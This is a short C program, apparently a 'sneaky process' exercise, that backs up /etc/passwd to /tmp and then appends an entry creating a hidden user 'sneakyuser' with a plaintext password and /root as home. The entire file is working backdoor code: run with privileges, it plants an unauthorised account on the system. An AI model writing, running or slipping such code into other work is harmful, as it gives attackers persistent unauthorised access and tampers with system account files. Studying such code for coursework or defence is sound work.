#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("sneaky_process pid = %d\n", getpid());

    system("cp /etc/passwd /tmp/passwd");
    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");


    return EXIT_SUCCESS;
}